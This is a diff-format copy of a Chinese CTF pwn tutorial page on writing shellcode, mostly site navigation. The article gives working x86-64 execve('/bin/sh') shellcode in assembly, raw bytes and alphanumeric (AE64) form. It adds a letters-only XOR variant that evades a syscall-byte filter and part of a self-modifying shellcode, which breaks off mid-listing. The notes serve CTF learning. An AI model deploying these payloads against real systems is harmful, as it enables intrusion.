+  <span class="md-ellipsis">
+    61-80题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    论道篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            论道篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../thinking/pre/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    前言
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../thinking/I/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    信息时代的我们
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../thinking/AI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI时代的我们
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    杂篇
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            杂篇
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../sth/proj/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    proj
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../sth/10-min-panda/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    十分钟学会panda
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../sth/others/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    一些杂七杂八的随手记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tools/bit32_visualizer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    32位位运算可视化工具
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_5" id="__nav_7_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    一些事故
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_5">
+            <span class="md-nav__icon md-icon"></span>
+            一些事故
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../sth/ssh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ssh配置
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../sth/codex/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    codex cli卡死
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="https://game.oldmaple.top" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    🎮 游戏
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      基础shellcode的书写
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="基础shellcode的书写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pwntools" class="md-nav__link">
+    <span class="md-ellipsis">
+      直接pwntools生成
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcodex86" class="md-nav__link">
+    <span class="md-ellipsis">
+      限制长度的shellcode（x86)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      字符限制shellcode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#orw" class="md-nav__link">
+    <span class="md-ellipsis">
+      orw
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      书写更短的shellcode
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="书写更短的shellcode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用残留寄存器
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      特殊指令的使用
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      寄存器复用
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      书写受限制的shellcode
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="书写受限制的shellcode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      字符限制
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      特定位置限制
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#seccomp" class="md-nav__link">
+    <span class="md-ellipsis">
+      seccomp绕过
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="seccomp绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level1-openreadwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      level1 开放open,read,write
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#level2-open" class="md-nav__link">
+    <span class="md-ellipsis">
+      level2 关闭open
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#level3-openat-readv-writev" class="md-nav__link">
+    <span class="md-ellipsis">
+      level3 openat readv writev
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#level35-openat2-read-write" class="md-nav__link">
+    <span class="md-ellipsis">
+      level3.5 openat2 read write
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tips
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+  
+                  
+
+
+
+<h1 id="shellcode">Shellcode</h1>
+<p>其实想要做的是代码注入总结篇</p>
+<h2 id="shellcode_1">基础shellcode的书写</h2>
+<p>要做shellcode，认为有下面几点要解决：</p>
+<ul>
+<li>一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有<code class="language-text highlight">mprotect</code>函数或者<code class="language-text highlight">mmap</code>函数，可以对指定内存区域申请权限</li>
+<li>需要知道写入地址，或者让寄存器指向写入的代码块</li>
+</ul>
+<h3 id="pwntools">直接pwntools生成</h3>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="w">    </span><span class="cm">/* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="cm">/* push b&#39;/bin///sh\x00&#39; */</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0x68</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x732f2f2f6e69622f</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="cm">/* push argument array [&#39;sh\x00&#39;] */</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="cm">/* push b&#39;sh\x00&#39; */</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0x1010101</span><span class="w"> </span><span class="err">^</span><span class="w"> </span><span class="mi">0x6873</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="mi">0x1010101</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="no">esi</span><span class="w"> </span><span class="cm">/* 0 */</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w"> </span><span class="cm">/* null terminate */</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">8</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rsi</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w"> </span><span class="cm">/* &#39;sh\x00&#39; */</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="no">edx</span><span class="w"> </span><span class="cm">/* 0 */</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span><span class="cm">/* call execve() */</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">SYS_execve</span><span class="w"> </span><span class="cm">/* 0x3b */</span>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="w">    </span><span class="nf">syscall</span>
+</code></pre></div>
+<p>这里将<code class="language-text highlight">/bin/sh</code>直接压入栈中，然后利用rsp的偏移获取地址，直接生成<code class="language-text highlight">shellcraft.sh()</code>生成即可，不做过多介绍</p>
+<h3 id="shellcodex86">限制长度的shellcode（x86)</h3>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rsi</span><span class="p">,</span><span class="no">rsi</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">0x68732f2f6e69622f</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nf">push</span><span class="w"> </span><span class="no">rdi</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nf">push</span><span class="w"> </span><span class="no">rsp</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="nf">pop</span><span class="w">  </span><span class="no">rdi</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="nf">mov</span><span class="w">  </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="nf">cdq</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="nf">syscall</span>
+</code></pre></div>
+<p>总长度为22（0x16)字节，实现的是<code class="language-text highlight">execve(&#39;/bin/sh&#39;,{&#39;sh&#39;},0)</code>，构造出来的条件是这样的：</p>
+<ul>
+<li>rax:0x3b</li>
+<li>rdi:’/bin/sh’</li>
+<li>rsi:’sh’</li>
+<li>rdx:NULL</li>
+</ul>
+<p>但是注意，需要eax的高二位为0(一般没什么问题)</p>
+<p>bytes形式：</p>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
+</code></pre></div>
+<p>可见字符形式(AE64生成)：</p>
+<p><em>关于ae64,直接看<a href="https://github.com/veritas501/ae64">这里</a>就可以</em></p>
+<div class="language-text highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP
+</code></pre></div>
+<p><strong>当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）</strong></p>
+<blockquote>
+<p>例如tgctf2025的shellcode，<a href="https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/tgctf/wp.md">这里</a></p>
+</blockquote>
+<h3 id="shellcode_2">字符限制shellcode</h3>
+<p>一般会出现过滤掉某些特定字符，这时候可以用**自改变shellcode**或者**某些纯字母的shellcode**</p>
+<p>纯字母（这里用的是<a href="https://v3rdant.cn/Pwn.Stack-Overflow-Overview/#shellcode%E7%9A%84%E4%B9%A6%E5%86%99">V3rdant的shellcode</a>）</p>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cm">/* from call rax */</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rcx</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="cm">/* XOR pop rsi, pop rdi, syscall */</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x41413030</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="nf">xor</span><span class="w"> </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">rcx</span><span class="err">+</span><span class="mi">0x30</span><span class="p">],</span><span class="w"> </span><span class="no">eax</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="cm">/* XOR /bin/sh */</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x34303041</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="nf">xor</span><span class="w"> </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">rcx</span><span class="err">+</span><span class="mi">0x34</span><span class="p">],</span><span class="w"> </span><span class="no">eax</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x41303041</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="nf">xor</span><span class="w"> </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">rcx</span><span class="err">+</span><span class="mi">0x38</span><span class="p">],</span><span class="w"> </span><span class="no">eax</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="cm">/* rdi = &amp;&#39;/bin/sh&#39; */</span>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="nf">push</span><span class="w"> </span><span class="no">rcx</span>
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="nf">xor</span><span class="w"> </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">0x34</span>
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
+<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="cm">/* rdx = 0 */</span>
+<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x30</span>
+<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="nf">xor</span><span class="w"> </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">0x30</span>
+<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rdx</span>
+<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>
+<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="nf">push</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>
+<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="cm">/* rax = 59 (SYS_execve) */</span>
+<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="nf">push</span><span class="w"> </span><span class="mi">0x41</span>
+<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
+<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="nf">xor</span><span class="w"> </span><span class="no">al</span><span class="p">,</span><span class="w"> </span><span class="mi">0x7a</span>
+<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>
+<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="cm">/* pop rsi, pop rdi*/</span>
+<a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="cm">/* syscall */</span><span class="w"> </span>
+<a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x6e</span>
+<a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x6f</span>
+<a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x4e</span>
+<a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x44</span>
+<a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>
+<a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a><span class="cm">/* /bin/sh */</span>
+<a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x6e</span>
+<a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x52</span>
+<a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x59</span>
+<a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x5a</span>
+<a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x6e</span>
+<a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x43</span>
+<a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x5a</span>
+<a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a><span class="na">.byte</span><span class="w"> </span><span class="mi">0x41</span>
+</code></pre></div>
+<p>这一段shellcode可以绕过<code class="language-text highlight">\x05\x0f</code>的过滤，但是注意这里需要由<code class="language-text highlight">call rax</code>启动</p>
+<p><strong>自改变shellcode</strong>（这里用的whuctf2025中shell_for_shell）</p>
+<div class="language-asm highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">si</span><span class="p">,</span><span class="w"> </span><span class="no">word</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">r15</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x100</span><span class="p">]</span><span class="w">  </span><span class="c1">;r15的值+0x100，赋给si（rsi，16位模式)</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">si</span><span class="p">,</span><span class="w"> </span><span class="mi">0x101</span><span class="w">                   </span><span class="c1">;再将si加上0x101</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">word</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">r15</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x100</span><span class="p">],</span><span class="w"> </span><span class="no">si</span><span class="w">  </span><span class="c1">;修改后的si存给r15+0x100的内存位置</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="cm">/*这里是为了给后面syscall找个确定位置，顺便自加一*/</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0x68</span><span class="w">                       </span><span class="c1">;压入&quot;h&quot;</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x732f2f2f6e69622f</span><span class="w">     </span><span class="c1">;压入/bin///s到rax中</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="no">rax</span><span class="w">                        </span><span class="c1">;压入rax中的值</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span><span class="w">                    </span><span class="c1">;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
